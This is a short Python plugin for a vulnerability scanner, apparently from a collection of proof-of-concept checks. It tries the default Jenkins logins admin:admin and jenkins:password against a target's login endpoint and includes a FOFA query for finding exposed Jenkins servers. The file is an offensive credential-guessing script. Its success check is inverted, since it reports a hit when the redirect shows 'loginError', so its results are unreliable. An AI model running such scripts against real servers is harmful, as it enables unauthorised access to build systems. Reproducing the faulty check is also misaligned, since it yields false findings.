#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   ' Jenkins默认口令',

      'level'     :   'high',

      'FOFA'      :   'app="Jenkins"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/j_spring_security_check'
  url1 = url + target
  ret['url'] = url1
  try:

    res=requests.get(url=url+'/login',headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and 'Sign in [Jenkins]' in res.text:
      res.close()
    else:
      return ret
  except:
    return ret
  try:
    data1 = 'j_username=admin&j_password=admin&from=&Submit=Sign+in'
    res=requests.post(url=url1,headers=headers,data=data1,timeout=5,verify=False,allow_redirects=False)
    if res.status_code == 302 and 'loginError' in res.headers['location']:
      ret['huixian'] = 'admin:admin'
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    data2 = 'j_username=jenkins&j_password=password&from=&Submit=Sign+in'
    res=requests.post(url=url1,headers=headers,data=data2,timeout=5,verify=False,allow_redirects=False)
    if res.status_code == 302 and 'loginError' in res.headers['location']:
      ret['huixian'] = 'jenkins:password'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret